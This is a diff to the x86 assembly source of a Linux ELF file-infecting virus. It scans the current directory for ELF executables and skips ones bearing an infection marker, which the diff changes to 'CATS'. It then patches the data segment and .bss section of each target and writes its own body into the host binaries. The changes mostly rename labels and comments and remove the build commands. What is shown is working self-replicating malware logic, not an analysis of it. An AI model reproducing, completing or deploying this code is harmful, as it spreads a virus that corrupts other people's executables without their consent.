@@ -1,6 +1,3 @@
-;; nasm -f elf -F dwarf -g cranky_data_virus.asm
-;; ld -m elf_i386 -e v_start -o cranky_data_virus cranky_data_virus.o
-
 section .text
     global v_start
 
@@ -8,8 +5,10 @@ v_start:
     ; virus body start
 
     ; make space in the stack for some uninitialized variables to avoid a .bss section
-    mov ecx, 2328   ; set counter to 2328 (x4 = 9312 bytes). filename (esp), buffer (esp+32), targets (esp+1056), targetfile (esp+2080)
-loop_bss:
+    mov ecx, 2328   ; set counter to 2328 (x4 = 9312 bytes). filename (esp), buffer (esp+32), targets (esp+1056), fileContent (esp+2080)
+    ; 0-32 not sure targets' name, 32-1056 ls all stuff, 1056-2080 elf_targets, 2080 check space
+    
+fake_space:         ;create fake space in stack
     push 0x00       ; reserve 4 bytes (double word) of 0's
     sub ecx, 1      ; decrement our counter by 1
     cmp ecx, 0
@@ -18,8 +17,9 @@ loop_bss:
 
     call folder
     db ".", 0
-folder:
-    pop ebx         ; name of the folder
+
+scan_folder:
+    pop ebx         ; into current folder
     mov esi, 0      ; reset offset for targets
     mov eax, 5      ; sys_open
     mov ecx, 0
@@ -57,25 +57,28 @@ find_filename_start:
     mov byte [edi+ecx], 0x2f   ; prepend file with ./ for full path (/)  edi is filename
     inc ecx
 
-find_filename_end:
-    ; look for the 00 which denotes the end of a filename
+copy_filename:
     inc ebx
     cmp ebx, 1024
     jge infect
 
+    ; copy file name
     push esi                ; save our target offset
+    push edi                ; save our fake .bss
+
     mov esi, edi            ; fake .bss
     add esi, 32             ; offset for buffer
-    add esi, ebx            ; set source
-    push edi                ; save our fake .bss
+    add esi, ebx            ; set source   
     add edi, ecx            ; set destination to filename
     movsb                   ; moved byte from buffer to filename
+    
     pop edi                 ; restore our fake .bss
     pop esi                 ; restore our target offset
     inc ecx                 ; increment offset stored in ecx
 
-    cmp byte [edi+32+ebx], 0x00 ; denotes end of the filename
-    jnz find_filename_end
+find_filename_end:
+    cmp byte [edi+32+ebx], 0x00 ; look for the 00 which denotes the end of a filename
+    jnz copy_filename       ; didn't find the end, keep storing filename 
 
     mov byte [edi+ecx], 0x00 ; we have a filename. Add a 0x00 to the end of the file buffer
 
@@ -97,36 +100,35 @@ scan_file:
 
     mov ebx, eax    ; fd
     mov eax, 3      ; sys_read
-    mov ecx, edi    ; address struct
-    add ecx, 2080   ; offset to targetfile in fake .bss
-    mov edx, 12     ; all we need are 4 bytes to check for the ELF header but 12 bytes to find signature
+    mov ecx, edi    
+    add ecx, 2080   ; read to edi+2080(fileContent)
+    mov edx, 12     ; read 12 bytes, 0-3 bytes to check for the ELF header, 9-12 bytes to find signature
     int 80h
 
-    call elfheader
-    dd 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed for endianness)
-elfheader:
-    pop ecx
-    mov ecx, dword [ecx]
-    cmp dword [edi+2080], ecx ; this 4 byte header indicates ELF! (dword).  edi+2080 is offset to targetfile in fake .bss
+    ; call check_elf
+
+check_elf:
+    mov ecx, 0x464c457f     ; 0x7f454c46 -> .ELF (but reversed for endianness)
+    cmp dword [edi+2080], ecx ; this 4 byte header indicates ELF! (dword).  edi+2080 is offset to fileContent in fake .bss
     jnz close_file  ; not an executable ELF binary.  Return
 
     ; check if infected
-    mov ecx, 0x001edd0e     ; 0x0edd1e00 signature reversed for endianness
-    cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to targetfile in fake .bss
+    mov ecx, 0x43415453     ; 0x43415453(CATS) signature, the infected marker
+    cmp dword [edi+2080+8], ecx   ; signature should show up after the 8th byte.  edi+2080 is offset to fileContent in fake .bss
     jz close_file                   ; signature exists.  Already infected.  Close file.
 
 save_target:
     ; good target!  save filename
     push esi    ; save our targets offset
     push edi    ; save our fake .bss
-    mov ecx, edi    ; temporarily place filename offset in ecx
-    add edi, 1056   ; offset to targets in fake .bss
-    add edi, esi
-    mov esi, ecx    ; filename -> edi -> ecx -> esi
-    mov ecx, 32
-    rep movsb   ; save another target filename in targets
-    pop edi     ; restore our fake .bss
-    pop esi     ; restore our targets offset
+    mov ecx, edi    ; ecx = edi temporarily place filename offset in ecx
+    add edi, 1056
+    add edi, esi    ; edi = edi+1056+esi
+    mov esi, ecx    ; esi = ecx = edi
+    mov ecx, 32     ; counter = 32, move 32bytes
+    rep movsb       ; save targets in buffer
+    pop edi         ; restore fake .bss
+    pop esi         ; restore targets offset
     add esi, 32
 
 close_file:
@@ -153,7 +155,7 @@ infect:
     mov ebx, eax            ; fd
 
     mov ecx, edi
-    add ecx, 2080           ; offset to targetfile in fake .bss
+    add ecx, 2080           ; offset to fileContent in fake .bss
 
 reading_loop:
     mov eax, 3              ; sys_read
@@ -183,14 +185,14 @@ reading_eof:
 program_header_loop:
     ; loop through program headers and find the data segment (PT_LOAD, offset>0)
 
-    ;0	p_type	type of segment
-    ;+4	p_offset	offset in file where to start the segment at
-    ;+8	p_vaddr	his virtual address in memory
-    ;+c	p_addr	physical address (if relevant, else equ to p_vaddr)
-    ;+10	p_filesz	size of datas read from offset
-    ;+14	p_memsz	size of the segment in memory
-    ;+18	p_flags	segment flags (rwx perms)
-    ;+1c	p_align	alignement
+    ;0  p_type  type of segment
+    ;+4 p_offset    offset in file where to start the segment at
+    ;+8 p_vaddr his virtual address in memory
+    ;+c p_addr  physical address (if relevant, else equ to p_vaddr)
+    ;+10    p_filesz    size of datas read from offset
+    ;+14    p_memsz size of the segment in memory
+    ;+18    p_flags segment flags (rwx perms)
+    ;+1c    p_align alignement
     add ax, word [edi+2080+42]
     cmp ecx, 0
     jbe infect                  ; couldn't find data segment.  let's close and look for next target
@@ -233,16 +235,16 @@ program_header_loop:
 section_header_loop:
     ; loop through section headers and find the .bss section (NOBITS)
 
-    ;0	sh_name	contains a pointer to the name string section giving the
-    ;+4	sh_type	give the section type [name of this section
-    ;+8	sh_flags	some other flags ...
-    ;+c	sh_addr	virtual addr of the section while running
-    ;+10	sh_offset	offset of the section in the file
-    ;+14	sh_size	zara white phone numba
-    ;+18	sh_link	his use depends on the section type
-    ;+1c	sh_info	depends on the section type
-    ;+20	sh_addralign	alignement
-    ;+24	sh_entsize	used when section contains fixed size entrys
+    ;0  sh_name contains a pointer to the name string section giving the
+    ;+4 sh_type give the section type [name of this section
+    ;+8 sh_flags    some other flags ...
+    ;+c sh_addr virtual addr of the section while running
+    ;+10    sh_offset   offset of the section in the file
+    ;+14    sh_size zara white phone numba
+    ;+18    sh_link his use depends on the section type
+    ;+1c    sh_info depends on the section type
+    ;+20    sh_addralign    alignement
+    ;+24    sh_entsize  used when section contains fixed size entrys
     add ax, word [edi+2080+46]
     cmp ecx, 0
     jbe finish_infection        ; couldn't find .bss section.  Nothing to worry about.  Finish the infection
@@ -293,7 +295,7 @@ finish_infection:
     mov ebx, eax            ; fd
     mov eax, 4              ; sys_write
     mov ecx, edi
-    add ecx, 2080           ; offset to targetfile in fake .bss
+    add ecx, 2080           ; offset to fileContent in fake .bss
     pop edx                 ; host file up to the offset where the virus resides
     int 80h
     mov [edi+7], edx        ; place the offset of the virus in this unused section of the filename buffer
@@ -320,11 +322,11 @@ delta_offset:
 
     mov eax, 4              ; sys_write
     mov ecx, edi
-    add ecx, 2080           ; offset to targetfile in fake .bss
+    add ecx, 2080           ; offset to fileContent in fake .bss
     mov edx, dword [edi+7]  ; offset of the virus
     add ecx, edx            ; let's continue where we left off
 
-    pop edx                 ; offset of last byte in targetfile in fake.bss
+    pop edx                 ; offset of last byte in fileContent in fake.bss
     sub edx, ecx            ; length of bytes to write
     int 80h
 
@@ -341,4 +343,3 @@ v_stop:
     mov eax, 1      ; sys_exit
     mov ebx, 0      ; normal status
     int 80h
-
